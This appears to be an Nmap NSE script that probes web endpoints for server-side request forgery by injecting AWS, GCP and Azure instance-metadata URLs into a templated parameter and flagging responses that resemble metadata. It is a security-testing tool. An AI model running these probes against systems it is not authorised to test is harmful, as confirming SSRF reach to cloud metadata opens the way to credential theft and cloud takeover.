local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local url = require "url"

description = [[
Probes application endpoints that embed a URL parameter (template with literal
CANARY) using cloud instance metadata URLs. Intended when you suspect an HTTP
parameter triggers server-side fetches (SSRF toward IMDS).

Example: --script-args 'http-cloud-metadata-reach.template=/api/proxy?target=CANARY'

Intrusive: may cause the application to reach metadata IPs.
]]

author = "nmap-ppro"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}

portrule = shortport.http

local TARGETS = {
  {name = "aws_imds", u = "http://169.254.169.254/latest/meta-data/"},
  {name = "gcp_meta_host", u = "http://metadata.google.internal/computeMetadata/v1/instance/id"},
  {name = "azure_imds", u = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
}

action = function(host, port)
  local template = stdnse.get_script_args(SCRIPT_NAME .. ".template")
  if not template or not string.find(template, "CANARY", 1, true) then
    return stdnse.format_output(
      false,
      "Set http-cloud-metadata-reach.template=/path?param=CANARY"
    )
  end
  local lines = {}
  for _, t in ipairs(TARGETS) do
    local path = string.gsub(template, "CANARY", url.escape(t.u), 1)
    local resp = http.get(host, port, path)
    local st = resp and resp.status and tostring(resp.status) or "?"
    local blen = (resp and resp.body and #resp.body) or 0
    local hint = ""
    if resp and resp.body then
      local b = string.lower(resp.body)
      if string.find(b, "ami-", 1, true) or string.find(b, "instanceid", 1, true) then
        hint = " (body hints at cloud metadata JSON/text)"
      end
    end
    lines[#lines + 1] = ("%s: status=%s len=%d%s"):format(t.name, st, blen, hint)
  end
  lines[#lines + 1] = "Differential responses may indicate SSRF; verify legally and out-of-band."
  return stdnse.format_output(true, lines)
end
